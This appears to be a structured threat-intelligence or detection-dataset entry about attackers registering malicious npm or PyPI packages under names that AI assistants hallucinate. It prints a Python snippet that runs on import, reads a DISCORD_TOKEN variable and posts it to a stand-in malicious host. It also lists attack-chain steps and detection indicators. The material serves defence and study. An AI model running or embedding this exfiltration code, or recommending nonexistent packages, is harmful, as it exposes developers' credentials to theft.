package_info.package_name: N/A (AI Hallucination Supply Chain Attack Pattern)
package_info.package_versions: N/A (applies to newly published, attacker-created versions)
package_info.why_malicious: Attackers exploit AI-generated package recommendations (hallucinations) by creating and publishing malicious packages with those names, anticipating that developers will trust and install them based on AI suggestions. This introduces malicious code into the software supply chain.

execution_context.file_location: setup.py (PyPI) or package.json/scripts (npm) or main module

malicious_snippets.code_snippet:
import os
import requests

def exfiltrate():
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        requests.post('https://malicious-domain.com/exfil', data={'token': token})
exfiltrate()
malicious_snippets.code_behavior: At import-time, the code accesses the DISCORD_TOKEN environment variable and sends its value to a hardcoded domain via HTTPS POST, enabling credential exfiltration.

malice_analysis.why_suspicious: The code exfiltrates sensitive environment variables to an external server without user consent.
malice_analysis.violated_expectations: Legitimate packages should not access or transmit environment variables unrelated to their documented functionality.
malice_analysis.similar_legitimate_use: Telemetry or crash reporting (with user consent and clear documentation).
key_indicators: Hardcoded external domain for data exfiltration
Network requests during import or install

malicious_snippets.code_behavior: During postinstall, the code reads a sensitive file and uploads its contents to a remote server, enabling data exfiltration.

malice_analysis.why_suspicious: The postinstall script exfiltrates local system files to an external server.
malice_analysis.violated_expectations: Postinstall scripts should only perform setup tasks necessary for the package, not access or transmit unrelated files.
malice_analysis.similar_legitimate_use: Automated error reporting (with user consent and redacted data).
key_indicators: Access to system files in install scripts

attack_chain.action: Attacker identifies an AI hallucination (nonexistent package recommendation) from ChatGPT.
attack_chain.leads_to: Attacker creates and publishes a malicious package with the hallucinated name.

attack_chain.action: Attacker publishes a malicious package to the public registry (npm, PyPI, etc.) with the hallucinated name.
attack_chain.leads_to: Developer installs the malicious package based on AI recommendation.

attack_chain.action: Developer installs/imports the malicious package in their project.
attack_chain.leads_to: Malicious code executes, exfiltrating sensitive data.

attack_chain.action: Malicious code executes at import-time or postinstall, exfiltrating credentials or files.
attack_chain.leads_to: Attacker receives exfiltrated data, compromising the developer or organization.

behavioral_signatures: Import-time or postinstall network requests to untrusted domains
Access to sensitive environment variables or system files in install/import scripts
Packages with names matching recent AI hallucination recommendations
file_indicators: setup.py or package.json scripts containing network exfiltration logic
References to sensitive files (e.g., /etc/passwd, environment variables) in install/import code
network_indicators: Outbound HTTP/HTTPS requests to domains not associated with the package author or project
POST requests containing environment variable values or file contents
detection_knowledge.how_to_detect: Monitor for packages with names that have recently appeared in AI-generated code recommendations but were not previously published. Analyze install and import scripts for network activity, especially exfiltration of environment variables or sensitive files. Flag packages that access sensitive data and transmit it to untrusted domains during installation or import.
